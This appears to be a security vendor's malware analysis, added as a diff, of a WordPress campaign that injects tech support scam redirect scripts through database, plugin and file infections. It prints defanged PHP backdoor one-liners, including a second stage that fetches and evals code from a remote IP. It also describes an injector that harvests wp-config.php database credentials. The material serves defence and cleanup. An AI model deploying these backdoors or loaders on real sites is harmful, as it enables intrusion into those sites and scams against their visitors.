@@ -1,0 +1,74 @@
+Multiple Ways to Inject the Same Tech Support Scam Malware
+
+Last month, we shared information about yet another series of ongoing massive infections using multiple different vectors to inject malicious scripts into WordPress websites.
+Shortly after, the campaign changed the domain names used in its scripts. Now it mainly uses hotopponents[.]site and learningtoolkit[.]club.
+At the time of this writing, PublicWWW finds the most common patterns of this malware on thousands of sites:
+
+“var _0xfcc4=” – 8501 sites
+“hotopponents.site/site.js” – 3636 sites
+
+Database Injections
+Multiple variations of the injected scripts have been found. For example, when the attackers have access to the WordPress database, they inject the following script into blog posts (wp_posts table):
+<script src='hxxps://hotopponents[.]site/site.js' type='text/javascript'></script>
+It loads an obfuscated script, which then loads a sequence of scripts from hxxps://www.learningtoolkit[.]club/link.php, then hxxps://mp3menu[.]org/mp3.js, and eventually redirects to tech support scam sites.
+Script found at www.learningtoolkit[.]club/link.php
+Reinfections of the Same Posts
+On some sites, hackers aren’t even bothering to remove older versions of their scripts. You can find multiples scripts injected into the same posts by different waves of the malware campaign.
+Multiple scripts injected into the same post
+Malware in wp_options Table
+The obfuscated learningtoolkit[.]club script that begins with “var _0xfcc4=” can also be found in the wp_options table. This happens when hackers exploit vulnerabilities in certain themes and plugins. The most common victims are sites with old tagDiv themes or unpatched versions of the Smart Google Code Inserter plugin.
+In the latter case, the malware is injected into the “sgcgoogleanalytic” option where the plugin stores the Google Analytics tracking code:
+Malware injected into the Smart Google Code Inserter’s settings
+Backdoors
+If the attackers manage to get access to the file system, after uploading backdoors, they try to infect .php and .js files of the compromised sites.
+The infection process begins with uploading a backdoor. We find them in site roots, in wp-content/uploads, or within other directories where the exploited vulnerability allows it.
+Here are some typical names and paths of the backdoors:
+
+wp-up.php
+wp-bk-report.php
+wp-crawl.php
+ring.php
+wp-content/uploads/2018/2018.php
+wp-temp-90434.php (the numbers are random in this filename)
+wp-content/uploads/assignments/some.php (vulnerability in the premium LearnDash 2.5.3 plugin)
+wp-content/uploads/ultimatemember/temp/<random>/k.php, n.php, k.php5 ( hole in the Ultimate Member plugin)
+
+In all cases, the backdoor looks like this:
+@file_put _contents('cleartemp','<?php '.base64_decode($_REQUEST['q'])); @include('cleartemp'); @unlink('cleartemp');
+The backdoor saves base64-decoded contents of the “q” parameter into the “cleartemp” file, then includes it to execute. It then immediately deletes the created file.
+All the backdoors have similar content, just different parameters and names of the temporary files: cleartemp, tempotempl, temple, b, fgdfgdfg. Sometimes, the temporary files are created in /tmp or /var/tmp directories.
+Second Level of the Backdoor
+The code of the temporary files described above is another level of the backdoor:
+$c1 = "hxxp://190 .97. 167. 206/p4.txt"; $n2 = "base64_decode"; $b = "hjghjerg"; @file_put _contents($b,"<?php ".$n2(@file_get _contents($c1))); include($b);@unlink($b);@eval($n2(@file_get _contents($c1)));
+This time, it loads the content of a remote file (p4.txt or tpn2pp.txt) from a server with the IP address 190 .97. 167. 206, and saves it to yet another temporary file with name hjghjerg or minteasd.  It then includes the saved file to execute its base64-decoded code and deletes the file. For some reason after that, the backdoor executes the same code again, this time using the eval function.
+Malware Injectors in Hjghjerg
+Code in the hjghjerg file is responsible for injecting malware into website files. Over time, we have collected quite a few variations:
+Currently, the most common version of the new infection injects the “var _0xfcc4” script into all files that have the <head> tag (for example, header.php in WordPress themes or almost any .html file).
+hjghjerg that injects malware into web page head section
+The script is injected right after the opening <head> tag and right before the closing </head> tag. A side effect of this attack is that permissions of the infected files are changed to 777 (full permission for everyone). Keep this in mind when cleaning sites – you might want to revert their permission back to something like 644, or even a stricter file permission.
+Payload to Infect JavaScript Files
+Here’s another variation of the hjghjerg file injecting the same script into any JavaScript files with names containing jquery.
+Payload that infects jQuery related files
+In this case, the malicious script is injected at the very top of the files immediately before their legitimate content.
+The find command for the jQuery-related .js files has improved since the August version where we reported a bug that resulted in malware being injected into non-.js files, including WordPress core CSS files.
+Coding Style and Dealing with Reinfections
+The coding style is very sloppy. There are no checks for errors or any fallback mechanisms.
+Note: These versions try to inject new scripts into all suitable files. They don’t check if they have previous versions of the malware, which results in multiple infections of the same sites. Sometimes, the hjghjerg file contains code to replace previous payload with a new one. e.g. the examhome[.]net script to the learningtoolkit[.]club script. However, even in this case, it only takes care of one specific variation of their previous injection and neglects all other waves that used different scripts.
+Hotopponents Version of the hjghjerg File
+Some versions of the hjghjerg file inject different variations of the scripts:
+Injecting two types of the hotopponents[.]site scriptsIn this case, it’s an external script from hxxps://hotopponents[.]site/site.js?wtr=1 injected into files with the <head> tag and an obfuscated code that loads “hxxps://hotopponents[.]site/site.js?wtr=2” injected into jQuery related JavaScript files.
+Cross-site Infections
+As you might have noticed, the injector uses the find command that starts searching for victim files from the server root level: “find / …”. This means that if the site and account isolation on the server is not good enough, even one compromised site will be enough to infect all sites that share the same account – or even the whole server, in a worst-case scenario.
+Of course, it’s hard to break out of the account level using this approach, even if the find command locates files that belong to different accounts (which doesn’t happen on most properly configured shared servers). Most likely, the script will not have sufficient permissions to modify them – unless the files had too broad permissions (e.g. 666 or 777) in the first place. This could happen, for example, if those third-party sites had been infected with the same malware and then cleaned without restoring the original permissions (remember, the injector changes permissions to 777?).
+Another approach used by the same campaign can theoretically be successful in breaking out of the compromised account on a small number of misconfigured shared servers since it only needs read permissions.
+Database wp-config.php Vector
+The following code is also found in some variations of the hjghjerg file:
+DB credentials from wp-config.php help infect WordPress posts
+This injector searches for all wp-config.php files on the server and then reads database credentials from them. After that, it connects to the mySQL database, searches for the “wp-posts” tables there, and appends the malicious scripts at the end of WordPress posts (post_content field).
+On most modern shared servers, the scope of this injector will also be limited to the compromised account. However, if the account isolation is not properly configured (which still rarely happens on some servers of small/amateur hosting providers), all WordPress sites on the server can be infected because of just one vulnerable site.
+Conclusion
+This long-lasting malware campaign demonstrates that all aspects of website security matter. Hackers don’t go for just a single vulnerability. They use a constantly updated kit of tools and exploits that help them maximize the effectiveness of their attacks.
+Fully patched themes and plugins, strong passwords changed after any compromise, correct server configuration and site isolation, strict permissions of files with sensitive data – missing any of these components increases chances of a website compromise.
+If you believe your site has been compromised by this attack, we can help. You can also refer to our Hacked WordPress guide for instructions on how to identify malicious payloads, clean up malware, and harden your site.
+10/26/2018
+We’ve identified a modification of this malware campaign which uses the new saskmade[.]net domain to redirect users to aggregated ads.
